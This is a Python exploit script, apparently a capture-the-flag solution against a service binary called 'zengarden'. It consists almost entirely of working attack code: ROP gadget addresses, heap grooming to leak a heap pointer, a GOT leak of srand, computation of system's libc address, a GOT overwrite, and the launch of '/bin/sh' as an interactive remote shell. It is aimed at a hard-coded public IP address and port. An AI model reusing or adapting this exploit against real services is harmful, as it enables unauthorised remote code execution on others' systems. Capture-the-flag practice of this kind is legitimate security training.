from isis import *
import re

#0x08049ea9: add dword [eax-0x360BBA75], edx ; ret  ;  (2 found)
#0x0804a725: pop eax ; ret  ;  (1 found)
#0x08049648: mov edx, dword [ebp-0x14] ; mov dword [esp], edx ; call eax ;  (1 found)
#0x0804a087: pop edi ; pop ebp ; ret  ;  (1 found)

exit_got=0x0804BC28
srand_got=0x804bb90

srand_plt=0x8048b30
pop_eax=0x0804a725
pr=pop_eax
gets_plt=0x8048bb0
simple_print=0x80491FF
bss=0x804BC8C

sprintf_got=0x804bb8c
sprintf_plt=0x8048b20

my_srand=0x00335b0
my_system=0x003f430

their_srand=0x0033530
their_system=0x003f250

#leak_srand=lei(simple_print,pr,srand_got)
leak_srand=lei(simple_print,pr,srand_got)
write_srand=lei(gets_plt,pr,srand_got)
use_srand_ptr=lei(srand_plt,pr) #argument to system comes after ropchain

block=lei(gets_plt,pr,bss)

rop_chain=leak_srand+write_srand+use_srand_ptr

def get_connection():
	s=get_socket(('localhost',2323))
	#junk=s.recv(0x10000)
	return s

def add_zen(socket,type,location,sign_message=None):
	socket.send('{} {} {}\n'.format('a',type,location))
	if(type=='s'):
		socket.send(sign_message+'\n')
	#junk=s.recv(0x10000)

def del_zen(socket,location):
	socket.send('d {}\n'.format(location))
	#junk=s.recv(0x10000)

def perform_zen(socket,location):
	socket.send('p {}\n'.format(location))
	time.sleep(1)
	return socket.recv(0x10000)

def leak_heap(socket,location):
	add_zen(socket,'p',location)
	zen=perform_zen(socket,location)
	address=re.findall('( )(0x.*)(\n)',zen)[0][1]
	#del_zen(socket,4)
	return int(address,16)

heap=0

command='/bin/sh;exit;'
def crash(s,msg,argument_offset=None):
	add_zen(s,'r',0)
	for i in range(10):
		del_zen(s,0)
	add_zen(s,'r',1)
	del_zen(s,0)
	global heap
	heap=leak_heap(s,4)

	print 'heap: {}'.format(hex(heap))
	msg += lei(heap+len(msg)+8)+command
	add_zen(s,'s',2,lei(heap+4)+msg)
	time.sleep(1)
	return perform_zen(s,1)


def exploit(target):
	s=get_socket(target)
	got=crash(s,lei(simple_print)+'%204xBBBB'+rop_chain)
	address=unpack("I",got[got.index(command)+len(command)+1:got.index(command)+1+len(command)+4])[0]

	#address=address-my_srand+my_system
	address=address-their_srand+their_system

	s.send(lei(address)+'\n')
	telnet_shell(s)



#exploit(('localhost',2323))
exploit(('54.218.22.41', 4766))



#three is still empty

#s=get_connection()
#sudo gdb -q ./zengarden-9b81162aea2ed4be3838faff59b3fd1b `ps -A|grep zengarden|awk '{print $1}'`
#crash(s,'A'*4) #eip=0x41414141